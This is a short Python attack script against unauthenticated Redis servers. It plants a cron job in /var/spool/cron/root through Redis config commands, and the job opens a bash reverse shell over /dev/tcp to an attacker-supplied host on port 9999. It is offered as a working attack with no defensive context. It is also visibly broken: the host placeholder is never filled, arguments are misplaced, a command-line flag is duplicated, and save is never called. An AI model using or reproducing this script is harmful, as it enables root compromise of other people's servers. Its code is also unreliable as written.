import redis
import argparse


def redis_exp(target, ip, port=6379):

    try:
        r = redis.Redis(ip, port)
        r.config_get('dir')
        r.set('xxx',"\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/%s/9999 0>&1\n\n", target)
        r.config_set('dir', '/var/spool/cron')
        r.config_set('dbfilename', 'root')
        r.save

    except Exception as e:
        pass


def main():

    # 命令行
    parser = argparse.ArgumentParser(description="-Demo-")
    parser.add_argument('-i', '--target', type=str)
    parser.add_argument('-i', '--ip', type=str)
    parser.add_argument('-p', '--port', type=str, default=6379)
    args = parser.parse_args()

    redis_exp(args.target, args.ip, args.port)


if __name__ == '__main__':
    main()
